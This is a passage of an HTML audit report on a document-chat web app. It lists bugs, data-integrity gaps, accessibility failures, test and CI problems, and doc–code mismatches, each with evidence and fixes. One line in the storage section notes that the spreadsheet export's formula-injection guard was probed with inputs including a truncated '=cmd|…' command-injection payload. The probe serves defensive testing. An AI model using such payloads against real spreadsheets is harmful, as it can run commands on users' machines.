+<dl><dt>Evidence</dt><dd>The whole ≤2000-char turn goes to <code>websearch_to_tsquery</code>, which ANDs every term. Live: <code>'can you list every storm drain sheet in the plan set'</code> → <strong>0 hits</strong> over 1,073 chunks; <code>'storm drain'</code> → 17. <code>[]</code> is indistinguishable from "no matches".</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> live.</dd><dt>Fix</dt><dd>OR-fuse content lemmas, or fall back to an OR query when AND returns 0; log <code>(terms, hits)</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">D2</span><span class="sev high">High</span><strong><code>ingestText</code>'s chunk swap is non-transactional; no unique <code>(document_id, chunk_index)</code></strong></div>
+<div class="loc">src/lib/ingest.ts:19-24 (contrast actions.ts:713)</div>
+<dl><dt>Evidence</dt><dd>delete → insert → embed → status as four autocommits; a kill in between leaves a <code>ready</code> doc with <code>chunk_count</code> intact and <strong>zero chunks</strong>, invisible to the reaper. Two concurrent <code>/process</code> calls can double the index. The replace path was hardened; this shared tail wasn't.</dd><dt>Fix</dt><dd>Embed first, then one transaction (the replace path has the shape); add the unique index.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>D3</strong> <code>usage_events</code> lacks <code>created_at</code> and <code>project_id</code> indexes — the monthly rollup filters <code>created_at &gt;=</code> (unservable by <code>(model, created_at)</code>); project delete seq-scans the fastest-growing table. <strong>Cheapest before 0018 is applied.</strong></li>
+<li><span class="sev medium">Medium</span><strong>D4</strong> Zero CHECK constraints — <code>status</code>/<code>role</code>/<code>purpose</code>/<code>extraction_method</code> are free text; a stray <code>'Ready'</code> silently drops rows from the chat manifest and the reaper.</li>
+<li><span class="sev medium">Medium</span><strong>D5</strong> Embeddings persisted one <code>UPDATE … RETURNING</code> per chunk (~1,250 round trips per document, vector shipped both ways).</li>
+<li><span class="sev medium">Medium</span><strong>D6</strong> Every <code>saveMessage</code> awaits an UPDATE on the single hot <code>projects</code> row (live: 1 live / 25 dead tuples).</li>
+<li><span class="sev medium">Medium</span><strong>D7</strong> HNSW indexes sidelined by the <code>project_id</code> filter (live EXPLAIN uses btree + sort; <code>idx_embeddings_vector</code> has 0 scans ever); at scale, post-filtering with <code>iterative_scan = off</code> and <code>ef_search = 40</code> can return fewer than <code>topK</code> or zero, silently.</li>
+<li><span class="sev medium">Medium</span><strong>D8</strong> Trigram GIN is 2.7× the heap and cannot serve 2-char identifiers (<code>A1</code>); pg_trgm needs 3.</li>
+<li><span class="sev medium">Medium</span><strong>D9</strong> Two dead indexes (<code>idx_chats_project_id</code>, <code>idx_messages_created_at</code>, 0 scans); <code>(chat_id, created_at)</code> missing.</li>
+<li><span class="sev medium">Medium</span><strong>D10</strong> <code>updateProjectDefaults</code> and <code>acceptSuggestion</code> mutate <code>projects</code> without bumping <code>updated_at</code> (no trigger exists).</li>
+<li><span class="sev low">Low</span> <code>drizzle-kit push</code> is destructive here (0016 objects + 12 RLS flags) — document as forbidden · no dev-HMR pool singleton · <code>saveMessage</code> silently truncates at 200k chars — <strong>it has fired twice in production</strong> · ordering keys on <code>created_at</code> not <code>id</code> · six unbounded reads (per-turn manifest is <code>select *</code> filtered in JS) · <code>document_chunks.project_id</code> denormalized with no enforcement.</li>
+</ul>
+<p><span class="sev ok">Verified correct</span> Every raw-SQL site parameterizes (<code>sql.raw</code> never in <code>src</code>) · all six transactions incl. <code>acceptSuggestion</code>'s in-SQL append · the pgvector query shape · <code>usage_events</code> <code>SET NULL</code> semantics · the reaper · test DB runs all 19 migrations.</p>
+
+<h2 id="docs">Documents, extraction, storage, artifacts</h2>
+
+<article class="f high"><div class="t"><span class="id">X1</span><span class="sev high">High</span><strong>Hybrid page stamping is wrong; <code>pageRangeFor</code> seeds from the first anchor</strong></div>
+<div class="loc">documents/process/route.ts:145 · src/lib/pageMap.ts:15-16</div>
+<dl><dt>Evidence</dt><dd>The splice pushes text pages with no <code># Page n</code> anchor; <code>pageRangeFor</code> initialises to <code>map[0].page</code>, so pre-anchor and between-anchor chunks inherit the nearest vision page. A 40-page doc with one vision run on p4 stamped its <em>last</em> chunk <code>{4,4}</code>.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by test — two lanes independently.</dd><dt>Fix</dt><dd>Emit <code># Page n</code> for every page on the hybrid and text paths (text-path docs get provenance for free); return <code>null</code> before the first anchor.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">X2</span><span class="sev high">High</span><strong>Vision extraction materialises the whole segment set in RAM</strong></div>
+<div class="loc">src/lib/pdfSegments.ts:51-69 · storage.ts:46-50</div>
+<dl><dt>Evidence</dt><dd>Measured with real <code>pdf-lib</code>: a 164.8 MB PDF → RSS 643.8 MB after split, +~44 MB base64 per in-flight segment ×2; <code>downloadToBuffer</code> doubles the source transiently. At the 200 MB cap: ~0.8–1.4 GB against a 2 GB default.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by measurement.</dd><dt>Fix</dt><dd>Stream segments (async generator); drop the <code>Buffer.from</code> copy; or lower the vision-path cap.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">X3</span><span class="sev high">High</span><strong>A 500-page plan set cannot finish inside <code>maxDuration = 800</code>; nothing is checkpointed</strong></div>
+<div class="loc">documents/process/route.ts:20 · visionExtraction.ts:28-95</div>
+<dl><dt>Evidence</dt><dd>25 segments ÷ concurrency 2 = 13 waves ⇒ 61 s/wave for a 60k-output-token transcription of 20 sheets. A platform kill discards everything; the reaper flips the row to <code>error</code> 20 min later.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by arithmetic; per-segment latency unmeasured.</dd><dt>Fix</dt><dd>Persist per-segment output; make <code>/process</code> resumable — or lower <code>EXTRACTION_MAX_PAGES</code> to what fits and raise concurrency.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">X4</span><span class="sev high">High</span><strong><code>deleteProject</code> sweeps nothing; <code>deleteChat</code> orphans artifacts</strong></div>
+<div class="loc">src/app/actions.ts:73-75, 196-199</div>
+<dl><dt>Evidence</dt><dd>Every child cascades, so one project delete permanently orphans originals, thumbnails, <code>extracted.txt</code>, revisions, attachments, generated images, artifacts + versions, with the path index gone.</dd><dt>Fix</dt><dd>Collect paths before the cascade and <code>removeObjects</code>; reuse the artifacts DELETE sweep in <code>deleteChat</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">X5</span><span class="sev high">High</span><strong>PDF artifacts silently delete curly quotes and apostrophes</strong></div>
+<div class="loc">src/lib/artifacts/toPdf.ts:18-19</div>
+<dl><dt>Evidence</dt><dd>The quote classes contain U+201A/U+2032 and U+201E/U+2033 but <strong>not</strong> U+2018/2019/201C/201D (their <code>'</code>/<code>"</code> are ASCII), so curly quotes fall through to <code>[^ -ÿ]</code>: <code>winAnsi("don’t") === "dont"</code>. The existing test asserts only "does not throw".</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by test + code-point dump.</dd><dt>Fix</dt><dd>Put the real code points in the classes.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>X6</strong> The current revision's <code>extracted.txt</code> is never deleted (<code>documents/route.ts:44-53</code> lists rev 1 + a phantom <code>rev1/</code>).</li>
+<li><span class="sev medium">Medium</span><strong>X7</strong> An abandoned replace bricks a healthy doc — <code>upload-url</code> sets <code>uploading</code> before any byte moves; the reaper errors it at 60 min; the manifest hides it while RAG still serves its chunks.</li>
+<li><span class="sev medium">Medium</span><strong>X8</strong> A throw after <code>status='processing'</code> leaves the spinner for 20 min — no catch around the ingest tail.</li>
+<li><span class="sev medium">Medium</span><strong>X9</strong> <code>failedPages</code> omits oversize-skipped and page-capped pages; CLAUDE.md claims otherwise. <span class="v-c">Confirmed</span> by test.</li>
+<li><span class="sev medium">Medium</span><strong>X10</strong> <code>addArtifactVersion</code> read-then-write with no unique <code>(artifact_id, version)</code> — concurrent edits duplicate version numbers.</li>
+<li><span class="sev medium">Medium</span><strong>X11</strong> <code>sliceWindow</code> can split a <code># Page n</code> anchor across windows, mislabelling both. <span class="v-c">Confirmed</span>.</li>
+<li><span class="sev medium">Medium</span><strong>X12</strong> The replace-abort path orphans three <code>rev&lt;N&gt;</code> objects, not the one the comment admits.</li>
+<li><span class="sev medium">Medium</span><strong>X13</strong> <code>artifacts/style.ts</code> still ships the retired steel-blue palette while claiming to mirror <code>globals.css</code> — every generated XLSX/DOCX/PDF/PPTX is off-brand. <span class="v-c">Confirmed</span> by diff.</li>
+<li><span class="sev low">Low</span> Code blocks lose indentation and clip in PDF · a C1 control char still crashes <code>toPdf</code> · whole-batch signed-URL failures swallowed silently · <code>getChatArtifacts</code> signs per row (the hottest listing) · <code>read_document</code> and keyword search ignore <code>documents.status</code> · <code>/api/extract</code> is live (chat attachments) but behind Vercel's ~4.5 MB body limit with a 200 MB cap, output truncated at 200k on save · <code>mapWithConcurrency</code> rejects the pool on first throw.</li>
+</ul>
+<p><span class="sev ok">Verified correct</span> Replace flow's embed-before-destroy property · the stale-row reaper · server-derived storage paths · artifact create/edit/regenerate roll back their object on DB failure · <code>toXlsx</code> formula-injection guard (probed with <code>=</code>, <code>@</code>, <code>+</code>, <code>-</code>, <code>=cmd|…</code>) · UUID artifact paths cannot collide.</p>
+
+<h2 id="fe">Frontend</h2>
+
+<article class="f critical"><div class="t"><span class="id">F1</span><span class="sev critical">Critical</span><strong>Chat switch mid-stream writes the reply into the wrong chat</strong></div>
+<div class="loc">src/app/page.tsx:583-593 · src/hooks/useChatPersistence.ts:57,78</div>
+<dl><dt>Evidence</dt><dd>The switch effect clears state but never calls <code>stop()</code> (wired only to the composer button); <code>onFinish</code> resolves <code>activeChatIdRef.current</code> at <em>completion</em> time and calls <code>saveMessage(currentChatId, …)</code>. Reproduced: <code>saveMessage(2, 'assistant', "answer for chat 1")</code>. Also mis-scopes <code>/api/embed</code>, usage, memory-suggest, title, <code>saveGeneratedImage</code>; the shared <code>useChat</code> store can re-materialise the stream inside chat B.</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> by test + independent read.</dd>
+<dt>Fix</dt><dd>Capture <code>chatId</code> at send (<code>streamingChatIdRef</code>), drop the write when it no longer matches, and <code>stop()</code> at the top of the switch effect.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F2</span><span class="sev high">High</span><strong>Archived chats are unreachable</strong></div>
+<div class="loc">src/components/chat/sidebar/Sidebar.tsx:18</div>
+<dl><dt>Evidence</dt><dd><code>archivedChats</code> is declared and never destructured; <code>variant='archived'</code> has zero callers; <code>loadArchivedChats</code>/<code>restoreChat</code> still wired. Fallout of the v4.51.0 <code>ArchivedSection</code> removal.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by grep.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F3</span><span class="sev high">High</span><strong>Opening any chat whose last message is a user turn re-saves and re-embeds it</strong></div>
+<div class="loc">src/app/page.tsx:957-996</div>
+<dl><dt>Evidence</dt><dd>The guard is only "id I last saved"; DB-loaded ids never match. Every open after a Stop/error/tab-close appends a duplicate row + 768-dim vector.</dd><dt>Fix</dt><dd>Mark loaded messages as persisted.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F4</span><span class="sev high">High</span><strong><code>useLocalStorage</code> writes <code>initialValue</code> over the stored value on every mount</strong></div>
+<div class="loc">src/hooks/useLocalStorage.ts:30-58, 97-112</div>
+<dl><dt>Evidence</dt><dd>The hydrate effect sets <code>rawRef</code> and <code>hasHydrated</code> synchronously; the write effect in the same commit sees <code>storedValue</code> still at <code>initialValue</code> → two spurious writes + a broadcast; a later-mounting sibling transiently resets the mounted one. Visible flicker for personas, panel width, pinned projects, doc scope; a tab closed in the window persists the initial.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> by test + read.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F5</span><span class="sev high">High</span><strong>41 raw Tailwind palette colours fail WCAG AA on the light-first theme; 9 <code>dark:</code> classes exist app-wide</strong></div>
+<div class="loc">Toaster.tsx:14-16 · DocumentCard.tsx:49-71 · MessageActions.tsx:85 · DeleteConfirmDialog.tsx:35 · +16 files</div>
+<dl><dt>Evidence</dt><dd>Independently recomputed: green-400 <strong>1.74</strong>, amber-400 <strong>1.67</strong>, red-400 <strong>2.77</strong>, blue-400 <strong>2.54</strong> on white (all pass on dark). Also the primary CTA (white on terracotta) <strong>3.90</strong>, slate on paper <strong>4.28</strong>, <code>text-muted-foreground/60</code> timestamps <strong>2.19</strong>. Passing tokens exist (<code>--destructive</code> 4.99, <code>--brand-success</code> 4.73).</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F6</span><span class="sev high">High</span><strong>The error banner lives only inside the active-chat branch</strong></div>
+<div class="loc">src/app/page.tsx:1321 vs :402, :412, :808, :913</div>
+<dl><dt>Evidence</dt><dd>"Failed to load models", "Failed to load projects", and <strong>"Failed to create chat"</strong> are set on Home and the landing page where no banner renders — Send does nothing, silently.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">F7</span><span class="sev high">High</span><strong>Hover-revealed controls have no focus reveal</strong></div>
+<div class="loc">DocumentCard.tsx:85 · ImageCard.tsx:44 · ChatContextMenu.tsx:79 · MessageActions.tsx:35 · CodeBlock.tsx:77 · ChatHeader.tsx:115 · ChatInputArea.tsx:451</div>
+<dl><dt>Evidence</dt><dd><code>opacity-0 group-hover:opacity-100</code> keeps elements in the tab order; <code>focus-visible</code> appears once app-wide. Keyboard users land on invisible Delete buttons.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>F8</strong> <code>useUrlNavSync</code> leaves <code>isApplyingPopRef</code> stuck after a no-op popstate, swallowing the next real push. <span class="v-c">Confirmed</span>.</li>
+<li><span class="sev medium">Medium</span><strong>F9</strong> Deep-linking <code>?chat=N</code> pushes a phantom entry when the project resolves. <span class="v-c">Confirmed</span>.</li>
+<li><span class="sev medium">Medium</span><strong>F10</strong> Command palette: Escape does nothing despite the footer (<code>cmdk</code> handles no Escape — <span class="v-c">confirmed</span>); no dialog role, trap, or focus restore.</li>
+<li><span class="sev medium">Medium</span><strong>F11</strong> Sidebar chat rows and document cards are click-only <code>div</code>s (the accessible pattern already exists in <code>ProjectLandingPage</code>).</li>
+<li><span class="sev medium">Medium</span><strong>F12</strong> 6 of 9 Radix dialogs lack a <code>Description</code> (console warning per open).</li>
+<li><span class="sev medium">Medium</span><strong>F13</strong> Panel resize writes localStorage + dispatches a CustomEvent on every <code>pointermove</code>.</li>
+<li><span class="sev medium">Medium</span><strong>F14</strong> <code>reconstructChunks</code> is O(chunks × 500) string work on the main thread — a 2,000-chunk plan set freezes the tab.</li>
+<li><span class="sev medium">Medium</span><strong>F15</strong> Mobile: at 390 px the sidebar overlays the app by default and paints over its own hamburger; the artifact panel's 360 px floor leaves ~30 px of transcript.</li>
+<li><span class="sev medium">Medium</span><strong>F16</strong> <code>HomeGreeting</code> computes time-of-day in render → SSR/client hydration mismatch (Phoenix vs UTC).</li>
+<li><span class="sev medium">Medium</span><strong>F17</strong> Images view: filtering to a project with no images hides the filter row (reload is the only recovery).</li>
+<li><span class="sev medium">Medium</span><strong>F18</strong> Concurrent drops/pastes clobber attachments (captured array, no updater).</li>
+<li><span class="sev medium">Medium</span><strong>F19</strong> <code>ArtifactThumbnail</code> iframes the cross-origin PDF URL the codebase documents as blocked.</li>
+<li><span class="sev medium">Medium</span><strong>F20</strong> Four fetch effects with no cancellation — fast switching shows the wrong data.</li>
+<li><span class="sev low">Low</span> <code>SheetsPreview</code> throws on malformed sheets · gallery dropdowns close only on mouse-leave · <code>ArtifactWorkspace</code> tab/edit reset on refetch, stale versions after restore, <code>pointercancel</code> leak · stale <code>default-model</code> survives Save · <code>ProjectDocumentsDialog</code> uploads only the first dropped file · no loading state for projects/chats · <code>PROJECT_CAPACITY_BYTES</code> read from client code (always <code>undefined</code>) · <code>global-error.tsx</code> hardcodes cool-palette hex · dead props (<code>Sidebar.activeProjectId</code>, <code>MessagesList.onDeleteMessage</code>, <code>MessageActions.onRegenerate</code>) · textarea disabled while streaming (contradicts the documented e2e expectation) · <code>Lightbox</code> has no scroll lock/focus management.</li>
+</ul>
+<p><code>page.tsx</code> is 1,623 lines with 27 <code>useState</code> / 21 refs / 13 effects / 44 <code>useCallback</code>; a nine-seam decomposition (F1 and F3 live in the first seam, <code>useChatSession</code>) is in the frontend lane report.</p>
+<p><span class="sev ok">Verified correct</span> Refs-for-closures on the transport body · <code>loadMessages</code> double staleness check · <code>MessageBody</code> memoisation genuinely holds during streaming · <code>sidebarActions</code> memo · <code>useDialogs</code> · reduced-motion · <code>citations.ts</code>/<code>remarkCitations.ts</code> regex hygiene · 39 hook/component test files green.</p>
+
+<h2 id="qa">Tests, gate, CI</h2>
+
+<article class="f high"><div class="t"><span class="id">Q1</span><span class="sev high">High</span><strong><code>npm test</code> is red, reproducibly</strong></div>
+<div class="loc">tests/unit/lib/keywordSearch.test.ts:11,26 · tests/helpers/test-db.ts:25-27 · vitest.config.ts:17</div>
+<dl><dt>Evidence</dt><dd>3/3 full runs: 141 files / 985 tests, <strong>4 failed</strong> (<code>Test timed out in 5000ms</code>, then <code>relation "artifact_versions" does not exist</code> ×3). The only DB file calling <code>createTestDb()</code> from <code>it()</code> bodies gets the default <code>testTimeout</code>, not the raised <code>hookTimeout</code>; the helper assigns <code>client</code>/<code>testDb</code> <em>before</em> <code>await migrate()</code>, so an aborted first call poisons the file. Green with <code>--testTimeout=30000</code>, <code>--no-file-parallelism</code>, or alone. Two other lanes hit the same load sensitivity.</dd>
+<dt>Verified</dt><dd><span class="v-c">Confirmed</span> — root cause bisected two ways and re-read by the reviewer.</dd>
+<dt>Fix</dt><dd>Move <code>createTestDb()</code> to <code>beforeEach</code>; memoize the init promise and publish only after migrate; set <code>testTimeout: 15000</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">Q2</span><span class="sev high">High</span><strong>Nothing stops a unit test from connecting to production</strong></div>
+<div class="loc">src/db/index.ts:1 · vitest.config.ts · tests/global-setup.ts (dead)</div>
+<dl><dt>Evidence</dt><dd><code>import 'dotenv/config'</code> loads <code>.env.local</code>; no <code>setupFiles</code>/<code>env</code>; 30 of 141 files mock <code>@/db</code>; the global setup is never referenced. No test reached prod during the audit — the backstop simply doesn't exist.</dd><dt>Fix</dt><dd><code>setupFiles</code> that sets an unroutable <code>DATABASE_URL</code> and a default <code>vi.mock('@/db')</code>.</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">Q3</span><span class="sev high">High</span><strong>CI gaps</strong></div>
+<div class="loc">.github/workflows/ci.yml · playwright.config.ts:7,20-24</div>
+<dl><dt>Evidence</dt><dd>No <code>timeout-minutes</code> (6 h default) · no <code>concurrency</code> group (every PR runs twice) · lint has no <code>--max-warnings</code> · Playwright browsers uncached · <code>webServer</code> has no <code>timeout</code> (60 s for a cold <code>next dev</code> on 2 vCPU) · <code>retries: 2</code> masks flakes · no <code>permissions:</code> · no Dependabot. Build-before-migrate is safe only because <code>/</code> prerenders static.</dd><dt>Right</dt><dd><code>npm ci</code>, npm cache, pgvector service with health check, migrate before e2e.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>Q4</strong> The PGlite "once per worker" claim is false — Vitest's forks pool isolates modules per file, so all 34 DB files boot their own instance + 19 migrations (~9 s each; suite is 65 s, not ~15 s).</li>
+<li><span class="sev medium">Medium</span><strong>Q5</strong> No coverage provider installed (<code>test:coverage</code> cannot run). Static map: <strong>46 of 173 src modules (27%) untested</strong> — highest-risk <code>api/artifacts/[id]/raw</code> (the proxy the CSP was relaxed for), <code>lib/errors.ts</code> (the sanitizer every route uses), <code>useDialogs</code>.</li>
+<li><span class="sev medium">Medium</span><strong>Q6</strong> E2E: 9 tests, none exercises a chat turn, upload, artifact, or retrieval; <code>project-management.spec.ts</code> asserts the home screen while claiming the sidebar; "send button visible" would pass with the button deleted.</li>
+<li><span class="sev low">Low</span> Edge-case probes (129 written, 112 passed) confirmed: <code>formatPageList</code> drops non-positive pages · <code>formatUsd</code> renders <code>$NaN</code>/<code>$∞</code> · <code>sliceWindow</code> <code>fromPage</code> respects document not page order; <code>maxChars: 0</code> spins · <code>rrfFuse</code> double-scores an id repeated within one list (unreachable today) · <code>parseCitation</code> accepts <code>p9-3</code> · <code>hideIncompleteTrailingCite</code> misses a partial after a completed marker · <code>parseNavUrl</code> accepts <code>1e3</code>/<code>0x10</code> · anchors are whitespace-strict · <code>usageTokens</code> passes negatives through.</li>
+</ul>
+<p><span class="sev ok">Verified correct</span> <code>auth.ts</code> 16/16 adversarial probes · <code>usage.ts</code> 10/10 (no double-counting) · <code>chunking.ts</code> (1 MB no-space line terminates) · <code>mmr.ts</code> never NaN · 0 skipped/todo/only · 0 assertion-free tests · 0 snapshots · 0 <code>doMock</code> leaks · 25 explicit 400-path assertions.</p>
+
+<h2 id="stale">Dead code, dependencies, documentation</h2>
+
+<article class="f high"><div class="t"><span class="id">K1</span><span class="sev high">High</span><strong>Four directly-imported packages are undeclared</strong></div>
+<div class="loc">src/lib/highlighter.ts:38-68 · src/lib/remarkCitations.ts:11-12</div>
+<dl><dt>Evidence</dt><dd><code>@shikijs/themes</code>, <code>@shikijs/langs</code> (14 dynamic imports), <code>unist-util-visit</code>, <code>@types/mdast</code> — zero matches in <code>package.json</code>, present only as hoisted transitives of <code>shiki</code>/<code>react-markdown</code>. A bump or a stricter installer breaks the build; the dynamic ones surface at runtime.</dd><dt>Verified</dt><dd><span class="v-c">Confirmed</span> (knip + depcheck + reviewer).</dd></dl></article>
+
+<article class="f high"><div class="t"><span class="id">K2</span><span class="sev high">High</span><strong>README's front door points at a ~19-release-stale handoff</strong></div>
+<div class="loc">README.md:118 → docs/SESSION_HANDOFF.md</div>
+<dl><dt>Evidence</dt><dd>Undated, "through v4.35.0", "28 commits ahead", "276 tests", "D2 next". CLAUDE.md says read the latest dated one — two contradictory entry points, the exact failure the current handoff's finding 13 warns about.</dd></dl></article>
+
+<ul class="dense">
+<li><span class="sev medium">Medium</span><strong>K3</strong> CLAUDE.md still says SQLite at <code>:181</code> and <code>:265</code>; a real 32 KB <code>sqlite.db</code> from the Ollama era is <strong>tracked in git</strong> (<code>.gitignore:53</code> inert).</li>
+<li><span class="sev medium">Medium</span><strong>K4</strong> No <code>.env.example</code>; <code>DOCUMENT_MAX_CHARS</code>, <code>EMBED_CONCURRENCY</code>, <code>EMBED_MAX_RETRIES</code>, <code>PROJECT_CAPACITY_BYTES</code> documented nowhere.</li>
+<li><span class="sev medium">Medium</span><strong>K5</strong> ~46 modules absent from CLAUDE.md incl. two whole routes: <code>/api/files/raw</code> (also the gate's undocumented third exemption) and <code>/api/suggest-followups</code> (a 7th LLM site with no usage capture).</li>
+<li><span class="sev medium">Medium</span><strong>K6</strong> README wrong on tests (215 vs 985), models, brand, Node version; silent on five shipped features (gate, grounded/citations, web ingest, code artifacts, Usage tab).</li>
+<li><span class="sev low">Low</span> Dead: <code>tests/global-setup.ts</code>, <code>tests/helpers/mock-ai.ts</code>, <code>scripts/spike-vision-extract.mjs</code>; <code>ChatListSkeleton</code>, <code>ProjectListSkeleton</code>, <code>isImageExtension</code>; ~21 needless exports; duplicate <code>IMAGE_MIME_TYPES</code> with different members · no <code>packageManager</code>, no <code>.nvmrc</code> (engines ≥22, CI 22, local/prod 24) · CHANGELOG 4.52.0's "8 moderate, monitor" is now 17 advisories / 11 high · handoff says 5 commits ahead, actually 6.</li>
+</ul>
+<p><strong>Dependencies:</strong> 34 outdated, 13 majors behind (<code>marked</code> 14→18, <code>ai</code> 6→7 — re-verify <code>inputTokenDetails</code> before any v7 bump, <code>pdfjs-dist</code>, <code>typescript</code> 5→7, <code>eslint</code> 9→10); 19 close with plain <code>npm update</code>. <strong>No genuinely unused dependency</strong> (all four depcheck hits were Tailwind v4 <code>@plugin</code> false positives).</p>
+<p><span class="sev ok">Verified clean</span> 0 TODO/FIXME/HACK · 0 <code>eslint-disable</code> · 0 <code>@ts-ignore</code> · 0 <code>debugger</code> · 1 justified <code>as any</code> · every legacy marker (<code>PRAGMA</code>, <code>budget_tokens</code>, <code>bg-gradient-to</code>, <code>createDocument(</code>, <code>maxTokens</code>, the v4.51.0 sidebar removals) returns zero hits · <code>.git</code> 8.7 MB, no large blob ever · <code>.prettierrc</code> correctly absent.</p>
+
+<h2 id="mismatch">Doc vs code — consolidated</h2>
+<div class="scroll"><table>
+<thead><tr><th>Doc · line</th><th>Claim</th><th>Reality</th></tr></thead>
+<tbody>
+<tr><td>CLAUDE.md:181, :265</td><td>SQLite server state / in-memory SQLite tests</td><td>Supabase Postgres / PGlite (contradicted in the same file)</td></tr>
+<tr><td>CLAUDE.md:158</td><td><code>db/index.ts</code> "connection with FK enforcement"</td><td>SQLite-era phrasing; the file sets pool options only</td></tr>
+<tr><td>CLAUDE.md · Context Pipeline</td><td>"Last 20 messages in full detail"</td><td>Sliced only when a summary exists</td></tr>
+<tr><td>CLAUDE.md · Registry</td><td>"one newest entry per family"</td><td><code>'other'</code> family leaks a fifth Claude row</td></tr>
+<tr><td>CLAUDE.md · Pricing</td><td>Sonnet 5 "reverting to $3/$15 after 2026-08-31"</td><td>No date logic; still $2/$10</td></tr>
+<tr><td>CLAUDE.md · Usage</td><td>"one row per LLM generation … six capture sites"</td><td>Six is accurate; 11 generation sites exist</td></tr>
+<tr><td>CLAUDE.md · Effort / Thinking</td><td>Effort clamped on switch; thinking capability-driven</td><td>Display-only clamp (server strips); thinking is unconditional</td></tr>
+<tr><td>CLAUDE.md · Gemini text</td><td>Google Search grounding on internal Gemini</td><td>Branch never executes — no caller passes the tool</td></tr>
+<tr><td>CLAUDE.md · <code>failed_pages</code></td><td>"or a page is skipped as oversize"</td><td>Oversize skips and page-capping are not recorded</td></tr>
+<tr><td>CLAUDE.md · Testing</td><td>PGlite "created once per worker … ~15 s"</td><td>Once per file; suite ~65 s</td></tr>
+<tr><td>CLAUDE.md · Security</td><td>"All POST API routes validate with Zod"</td><td><code>/api/extract</code> uses <code>formData</code>; GETs hand-coerce ids</td></tr>
+<tr><td>CLAUDE.md · CSP</td><td>—</td><td>Omits <code>connect-src 'self' https:</code>, <code>object-src 'self'</code>, YouTube allowances</td></tr>
+<tr><td>CLAUDE.md · Styling</td><td>"no backdrop-blur" / "16 glass-panel consumers" / "<code>text-ink</code> in use"</td><td>11 sites / 21 files, 28 occurrences / zero uses</td></tr>
+<tr><td>CLAUDE.md · Sidebar</td><td><code>ArchivedSection</code> "dead and removed"</td><td>It was the only archived-chats UI</td></tr>
+<tr><td>CLAUDE.md · E2E</td><td>"Textarea is always enabled"</td><td><code>disabled={isLoading}</code> during every response</td></tr>
+<tr><td>CLAUDE.md · Artifacts</td><td>PDFs via same-origin proxy</td><td>True for <code>ArtifactPreview</code>; <code>ArtifactThumbnail</code> uses the cross-origin URL</td></tr>
+<tr><td>CLAUDE.md · Migrations</td><td><code>0000</code>–<code>0017</code> applied, <code>0018</code> pending</td><td><span class="sev ok">Accurate</span> — verified live</td></tr>
+<tr><td>CLAUDE.md · Vercel CLI</td><td>installed &amp; authenticated</td><td><span class="sev ok">Installed</span> (54.14.5); <code>.vercel/</code> has <code>repo.json</code> only</td></tr>
+<tr><td>AUTH.md:15</td><td>Exemptions: <code>/login</code>, <code>/api/auth</code></td><td><code>/api/files/raw</code> is a third (HMAC-signed, undocumented)</td></tr>
+<tr><td>README.md:118, :100, :10, :53, :106</td><td>Stale handoff link; 215 tests; Opus 4.8/Sonnet 4.6; Node 24; old brand</td><td>See K2/K6</td></tr>
+<tr><td>SESSION_HANDOFF_2026-09-01.md:7, :50</td><td>"5 commits ahead"</td><td>6 (<code>7f6ca74..d278fda</code>)</td></tr>
+<tr><td>CHANGELOG 4.52.0</td><td>"8 moderate advisories, monitor" / "26 warnings"</td><td>17 (11 high) / 24</td></tr>
+<tr><td>PERSONAS.md</td><td>roster + tiers</td><td><span class="sev ok">Accurate</span> (no edit-date stamp)</td></tr>
+</tbody></table></div>
+
+<h2 id="release">Impact on the pending release checklist</h2>
+<p>The handoff's next action is: apply <code>0018</code> → push → live-smoke → version/tag. This audit changes the order.</p>
+<div class="scroll"><table>
+<thead><tr><th>When</th><th>Do</th><th>Why</th></tr></thead>
+<tbody>
+<tr><td><strong>Before applying <code>0018</code></strong></td><td>Fix Sonnet 5 pricing (C2) · add <code>created_at</code>/<code>project_id</code> indexes and the <code>purpose</code>/non-negative CHECKs (D3, D4) · fold the 13 <code>ENABLE ROW LEVEL SECURITY</code> statements into a migration (S3)</td><td>All small; only get cheaper before the table exists and rows are frozen</td></tr>
+<tr><td><strong>Before pushing</strong></td><td><code>next@^16.2.11</code> (S1) · fix the red gate (Q1) · declare the four phantom deps (K1) · wire <code>abortSignal</code>/<code>consumeStream</code>/<code>after()</code> (C1)</td><td>Auth advisory; the release rule says the gate passes clean; the ledger should be trustworthy from row one</td></tr>
+<tr><td><strong>With the release</strong></td><td>F1 wrong-chat write · F2 archived chats · F3 duplicate re-save · X1 hybrid pages · X5 PDF quotes · X4 storage sweeps</td><td>Contained, independently testable, user-visible</td></tr>
+<tr><td><strong>Follow-ups</strong></td><td><code>pdfjs-dist</code> major (S2) · streaming/resumable extraction (X2/X3) · FTS OR-fusion (D1) · transactional ingest (D2) · contrast pass (F5) · docs refresh (K2–K6) · <code>page.tsx</code> decomposition</td><td>Larger scope; sequence into the roadmap</td></tr>
+</tbody></table></div>
+
+<h2 id="solid">What is genuinely solid</h2>
+<div class="two">
